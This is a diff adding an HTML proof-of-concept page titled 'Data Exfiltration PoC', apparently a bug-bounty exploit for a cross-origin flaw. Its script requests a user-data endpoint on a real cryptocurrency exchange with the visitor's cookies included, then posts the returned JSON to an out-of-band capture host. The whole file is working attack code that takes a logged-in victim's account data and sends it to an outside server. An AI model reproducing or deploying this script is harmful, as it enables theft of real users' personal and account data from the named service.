@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Exfiltration PoC</title>
+</head>
+<body>
+    <script>
+        // Perform a GET request to the target endpoint
+        fetch("https://www.okx.com/v3/c2c/bestUser/form", {
+            method: "GET",
+            credentials: "include"  // Sends cookies with the request
+        })
+        .then(response => response.json()) // Parse response as JSON
+        .then(data => {
+            // Send data to your endpoint for capture
+            fetch("https://ajmelaxgbbrifvfovjkrq28w4dnaix1ca.oast.fun/capture", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        })
+        .catch(error => console.error("Error:", error));
+    </script>
+</body>
+</html>
